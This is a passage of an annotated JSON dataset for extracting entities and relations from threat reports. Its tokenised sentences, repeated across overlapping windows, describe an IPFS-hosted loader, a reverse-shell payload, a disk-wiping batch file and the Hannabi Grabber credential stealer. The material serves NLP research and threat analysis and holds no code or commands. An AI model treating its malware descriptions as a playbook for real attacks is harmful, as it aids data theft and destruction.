[{"type": "SO", "sent_id": 4, "global_pos": [111, 111], "name": "IPFS network", "pos": [30, 32], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [150, 150], "name": "final payload", "pos": [8, 10], "index": "11_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [154, 154], "name": "IPFS", "pos": [12, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [157, 157], "name": "Windows batch file", "pos": [15, 18], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RF", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "ST", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "RF", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "ST", "evidence": [3], "h": 6, "t": 8}, {"r": "RF", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [3, 4], "t": 7, "h": 9}, {"r": "ST", "evidence": [4], "h": 9, "t": 10}, {"r": "RF", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 10}, {"r": "RF", "evidence": [4], "h": 9, "t": 10}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 10, "t": 12}, {"r": "CO", "evidence": [7], "h": 11, "t": 13}]}, {"title": "002-14", "sents": [["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."], ["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."], ["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."], ["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."], ["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."], ["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."], ["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "malware", "pos": [5, 6], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [13, 13], "name": "Windows registry", "pos": [13, 15], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [28, 28], "name": "IPFS gateway", "pos": [12, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "Talos", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "payloads", "pos": [9, 10], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [48, 48], "name": "IPFS gateway", "pos": [12, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "loader", "pos": [7, 8], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [81, 81], "name": "IPFS network", "pos": [30, 32], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [120, 120], "name": "final payload", "pos": [8, 10], "index": "8_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [124, 124], "name": "IPFS", "pos": [12, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [127, 127], "name": "Windows batch file", "pos": [15, 18], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [135, 135], "name": "batch file", "pos": [4, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [145, 145], "name": "Script.bat", "pos": [14, 15], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "ST", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "RF", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "RD", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "ST", "evidence": [2], "h": 3, "t": 5}, {"r": "RF", "evidence": [2], "h": 3, "t": 5}, {"r": "RD", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "ST", "evidence": [3], "h": 6, "t": 7}, {"r": "RF", "evidence": [3], "h": 6, "t": 7}, {"r": "ST", "evidence": [3], "h": 6, "t": 7}, {"r": "RF", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 7, "t": 9}, {"r": "CO", "evidence": [6], "h": 8, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 8, "t": 11}, {"r": "ST", "evidence": [6, 7], "t": 9, "h": 12}, {"r": "RF", "evidence": [6, 7], "t": 9, "h": 12}]}, {"title": "002-15", "sents": [["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."], ["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."], ["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."], ["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."], ["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."], ["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."], ["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "IPFS gateway", "pos": [12, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "Talos", "pos": [2, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "payloads", "pos": [9, 10], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "IPFS gateway", "pos": [12, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "loader", "pos": [7, 8], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [65, 65], "name": "IPFS network", "pos": [30, 32], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [104, 104], "name": "final payload", "pos": [8, 10], "index": "6_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [108, 108], "name": "IPFS", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [111, 111], "name": "Windows batch file", "pos": [15, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [119, 119], "name": "batch file", "pos": [4, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [129, 129], "name": "Script.bat", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [132, 132], "name": "It", "pos": [0, 1], "index": "11_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [134, 134], "name": "volume shadow copies", "pos": [2, 5], "index": "12_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [142, 142], "name": "C : \\Users", "pos": [10, 13], "index": "13_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [158, 158], "name": "mounted filesystems", "pos": [26, 28], "index": "14_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [163, 163], "name": "system", "pos": [31, 32], "index": "15_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RF", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "ST", "evidence": [1], "h": 1, "t": 3}, {"r": "RF", "evidence": [1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "ST", "evidence": [2], "h": 4, "t": 5}, {"r": "RF", "evidence": [2], "h": 4, "t": 5}, {"r": "ST", "evidence": [2], "h": 4, "t": 5}, {"r": "RF", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 5, "t": 7}, {"r": "CO", "evidence": [5], "h": 6, "t": 8}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 9}, {"r": "ST", "evidence": [5, 6], "t": 7, "h": 10}, {"r": "RD", "evidence": [6, 7], "h": 10, "t": 12}, {"r": "RF", "evidence": [5, 6], "t": 7, "h": 10}, {"r": "RD", "evidence": [6, 7], "h": 10, "t": 13}, {"r": "RD", "evidence": [6, 7], "h": 10, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}, {"r": "WR", "evidence": [7], "h": 11, "t": 13}, {"r": "WR", "evidence": [7], "h": 11, "t": 14}, {"r": "CO", "evidence": [7], "h": 14, "t": 15}]}, {"title": "002-16", "sents": [["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."], ["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."], ["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."], ["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."], ["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."], ["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."], ["The", "malware", "incorrectly", "tried", "to", "invoke", "the", "batch", "file", "in", "the", "analyzed", "samples", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "Talos", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "payloads", "pos": [9, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "IPFS gateway", "pos": [12, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "loader", "pos": [7, 8], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [45, 45], "name": "IPFS network", "pos": [30, 32], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "final payload", "pos": [8, 10], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [88, 88], "name": "IPFS", "pos": [12, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "Windows batch file", "pos": [15, 18], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "batch file", "pos": [4, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [109, 109], "name": "Script.bat", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [112, 112], "name": "It", "pos": [0, 1], "index": "10_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [114, 114], "name": "volume shadow copies", "pos": [2, 5], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [122, 122], "name": "C : \\Users", "pos": [10, 13], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [138, 138], "name": "mounted filesystems", "pos": [26, 28], "index": "13_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [143, 143], "name": "system", "pos": [31, 32], "index": "14_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 4, "t": 6}, {"r": "CO", "evidence": [4], "h": 5, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 5, "t": 8}, {"r": "ST", "evidence": [4, 5], "t": 6, "h": 9}, {"r": "RD", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "RF", "evidence": [4, 5], "t": 6, "h": 9}, {"r": "RD", "evidence": [5, 6], "h": 9, "t": 12}, {"r": "RD", "evidence": [5, 6], "h": 9, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "WR", "evidence": [6], "h": 10, "t": 12}, {"r": "WR", "evidence": [6], "h": 10, "t": 13}, {"r": "CO", "evidence": [6], "h": 13, "t": 14}]}, {"title": "002-17", "sents": [["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."], ["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."], ["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."], ["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."], ["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."], ["The", "malware", "incorrectly", "tried", "to", "invoke", "the", "batch", "file", "in", "the", "analyzed", "samples", "."], ["The", "loader", "'s", "third", "cluster", "was", "tasked", "with", "retrieving", "and", "executing", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "loader", "pos": [7, 8], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [30, 30], "name": "IPFS network", "pos": [30, 32], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "final payload", "pos": [8, 10], "index": "2_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "IPFS", "pos": [12, 13], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "Windows batch file", "pos": [15, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "batch file", "pos": [4, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [94, 94], "name": "Script.bat", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [99, 99], "name": "volume shadow copies", "pos": [2, 5], "index": "8_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [107, 107], "name": "C : \\Users", "pos": [10, 13], "index": "9_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [123, 123], "name": "mounted filesystems", "pos": [26, 28], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [128, 128], "name": "system", "pos": [31, 32], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [145, 145], "name": "loader", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [155, 155], "name": "Hannabi Grabber", "pos": [11, 13], "index": "13_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 3}, {"r": "CO", "evidence": [3], "h": 2, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 2, "t": 5}, {"r": "ST", "evidence": [3, 4], "t": 3, "h": 6}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "RF", "evidence": [3, 4], "t": 3, "h": 6}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 9}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 10}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "WR", "evidence": [5], "h": 7, "t": 9}, {"r": "WR", "evidence": [5], "h": 7, "t": 10}, {"r": "CO", "evidence": [5], "h": 10, "t": 11}, {"r": "FR", "evidence": [7], "h": 12, "t": 13}]}, {"title": "002-18", "sents": [["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."], ["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."], ["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."], ["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."], ["The", "malware", "incorrectly", "tried", "to", "invoke", "the", "batch", "file", "in", "the", "analyzed", "samples", "."], ["The", "loader", "'s", "third", "cluster", "was", "tasked", "with", "retrieving", "and", "executing", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "."], ["It", "uses", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", ",", "collects", "survey", "data", ",", "geographic", "location", "via", "IPInfo", "service", ",", "takes", "screenshots", ",", "and", "sends", "JSON", "formatted", "data", "to", "an", "attacker-controlled", "Discord", "server", "."]], "vertexSet": [[{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "final payload", "pos": [8, 10], "index": "0_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [40, 40], "name": "IPFS", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "Windows batch file", "pos": [15, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [51, 51], "name": "batch file", "pos": [4, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "Script.bat", "pos": [14, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [64, 64], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [66, 66], "name": "volume shadow copies", "pos": [2, 5], "index": "6_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [74, 74], "name": "C : \\Users", "pos": [10, 13], "index": "7_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [90, 90], "name": "mounted filesystems", "pos": [26, 28], "index": "8_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [95, 95], "name": "system", "pos": [31, 32], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [112, 112], "name": "loader", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [122, 122], "name": "Hannabi Grabber", "pos": [11, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [132, 132], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [134, 134], "name": "Discord Webhooks", "pos": [2, 4], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [137, 137], "name": "C2", "pos": [5, 6], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [149, 149], "name": "IPInfo service", "pos": [17, 19], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [163, 163], "name": "Discord server", "pos": [31, 33], "index": "16_0"}]], "labels": [{"r": "CO", "evidence": [2], "h": 0, "t": 2}, {"r": "CO", "evidence": [2, 3], "h": 0, "t": 3}, {"r": "ST", "evidence": [2, 3], "t": 1, "h": 4}, {"r": "RD", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "RF", "evidence": [2, 3], "t": 1, "h": 4}, {"r": "RD", "evidence": [3, 4], "h": 4, "t": 7}, {"r": "RD", "evidence": [3, 4], "h": 4, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "WR", "evidence": [4], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "h": 5, "t": 7}, {"r": "WR", "evidence": [4], "h": 5, "t": 8}, {"r": "CO", "evidence": [4], "h": 8, "t": 9}, {"r": "FR", "evidence": [6], "h": 10, "t": 11}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 12}, {"r": "FR", "evidence": [7], "h": 12, "t": 13}, {"r": "ST", "evidence": [7], "h": 13, "t": 14}, {"r": "RF", "evidence": [7], "h": 13, "t": 14}, {"r": "IJ", "evidence": [7], "h": 12, "t": 15}, {"r": "ST", "evidence": [7], "h": 12, "t": 16}, {"r": "RF", "evidence": [7], "h": 12, "t": 16}]}, {"title": "002-19", "sents": [["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."], ["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."], ["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."], ["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."], ["The", "malware", "incorrectly", "tried", "to", "invoke", "the", "batch", "file", "in", "the", "analyzed", "samples", "."], ["The", "loader", "'s", "third", "cluster", "was", "tasked", "with", "retrieving", "and", "executing", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "."], ["It", "uses", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", ",", "collects", "survey", "data", ",", "geographic", "location", "via", "IPInfo", "service", ",", "takes", "screenshots", ",", "and", "sends", "JSON", "formatted", "data", "to", "an", "attacker-controlled", "Discord", "server", "."], ["In", "addition", ",", "the", "malware", "targets", "Chrome", "passwords", "and", "cookies", ",", "as", "well", "as", "Mozilla", "Firefox", "data", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "final payload", "pos": [8, 10], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [27, 27], "name": "IPFS", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "Windows batch file", "pos": [15, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "batch file", "pos": [4, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "Script.bat", "pos": [14, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [51, 51], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [53, 53], "name": "volume shadow copies", "pos": [2, 5], "index": "6_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [61, 61], "name": "C : \\Users", "pos": [10, 13], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [77, 77], "name": "mounted filesystems", "pos": [26, 28], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [82, 82], "name": "system", "pos": [31, 32], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [99, 99], "name": "loader", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [109, 109], "name": "Hannabi Grabber", "pos": [11, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [119, 119], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [121, 121], "name": "Discord Webhooks", "pos": [2, 4], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [124, 124], "name": "C2", "pos": [5, 6], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [136, 136], "name": "IPInfo service", "pos": [17, 19], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [150, 150], "name": "Discord server", "pos": [31, 33], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [157, 157], "name": "malware", "pos": [4, 5], "index": "17_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [159, 159], "name": "Chrome", "pos": [6, 7], "index": "18_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [167, 167], "name": "Mozilla Firefox", "pos": [14, 16], "index": "19_0"}]], "labels": [{"r": "CO", "evidence": [1], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 3}, {"r": "ST", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "RD", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RF", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "RD", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "RD", "evidence": [2, 3], "h": 4, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "WR", "evidence": [3], "h": 5, "t": 8}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 11, "t": 12}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "ST", "evidence": [6], "h": 13, "t": 14}, {"r": "RF", "evidence": [6], "h": 13, "t": 14}, {"r": "IJ", "evidence": [6], "h": 12, "t": 15}, {"r": "ST", "evidence": [6], "h": 12, "t": 16}, {"r": "RF", "evidence": [6], "h": 12, "t": 16}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}, {"r": "RD", "evidence": [7], "h": 17, "t": 19}, {"r": "RD", "evidence": [7], "h": 17, "t": 19}, {"r": "WR", "evidence": [7], "h": 17, "t": 19}]}, {"title": "002-20", "sents": [["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."], ["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."], ["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."], ["The", "malware", "incorrectly", "tried", "to", "invoke", "the", "batch", "file", "in", "the", "analyzed", "samples", "."], ["The", "loader", "'s", "third", "cluster", "was", "tasked", "with", "retrieving", "and", "executing", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "."], ["It", "uses", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", ",", "collects", "survey", "data", ",", "geographic", "location", "via", "IPInfo", "service", ",", "takes", "screenshots", ",", "and", "sends", "JSON", "formatted", "data", "to", "an", "attacker-controlled", "Discord", "server", "."], ["In", "addition", ",", "the", "malware", "targets", "Chrome", "passwords", "and", "cookies", ",", "as", "well", "as", "Mozilla", "Firefox", "data", "."], ["Discord", "and", "Roblox", "data", "are", "of", "particular", "interest", "to", "the", "information", "stealer", "."]], 